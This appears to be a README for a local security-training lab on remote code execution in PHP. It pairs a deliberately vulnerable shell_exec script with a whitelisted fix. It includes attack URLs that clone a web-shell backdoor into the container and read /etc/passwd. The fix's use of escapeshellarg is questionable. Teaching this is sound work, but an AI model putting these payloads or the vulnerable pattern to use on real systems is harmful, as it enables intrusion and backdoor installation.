# Example of RCE Vulnerability

An RCE vulnerability consists of executing commands remotely on the server to access it or install malware on it.

### Vulnerable Website

http://localhost:8080/RCE/rce_vulnerable.php

On this site, you can send a command and the server will execute it; you can try with the `ls` command.

```
<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
/* If the parameter cmd not exists finish the execution */
if (!isset($_GET['cmd'])) {
	die("Falta el parametro cmd");
}
$output = shell_exec($_GET['cmd']);
echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
?>
```

http://localhost:8080/RCE/rce_vulnerable.php?cmd=ls

![alt text](./images/ls_example.png)

Executing a `git clone` command could install a GitHub repository on the server.

> [!WARNING]
> **THIS COMMAND WILL INSTALL A BACKDOOR IN THE CONTAINER AND MIGHT TRIGGER WINDOWS DEFENDER. DO IT ONLY IF YOU KNOW WHAT YOU ARE DOING. THE DATA CONTAINER DOES NOT PERSIST ANYTHING ON THE HOST MACHINE.**

http://localhost:8080/RCE/rce_vulnerable.php?cmd=git%20clone%20https://github.com/xl7dev/WebShell.git

You could also try to retrieve the `/etc/passwd` file.

http://localhost:8080/RCE/rce_vulnerable.php?cmd=cat%20/etc/passwd

![alt text](./images/passwd_example.png)

### Secure Website

http://localhost:8080/RCE/rce_safe.php

Although the ideal solution is not to allow the website to execute system commands, if we need to execute specific commands, we can create a whitelist of allowed commands.

```
<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
/*Array with the allowed commands to execute in the server */
$allowed_cmds = ["ls", "whoami", "pwd"];

/* If the parameter cmd not exists or isn't in the list finish the execution */
if (!isset($_GET['cmd']) || !in_array($_GET['cmd'], $allowed_cmds)) {
	die("Falta el parametro cmd  o ha insertado un comando no valido");
}

/* Execute the command in the cmd parameter and shows the output */
$output = shell_exec(escapeshellarg($_GET['cmd']));
echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
?>
```

If we execute an unauthorized command, execution will stop before running it.

http://localhost:8080/RCE/rce_safe.php?cmd=cat%20/etc/passwd

![alt text](./images/fail_passwd_example.png)
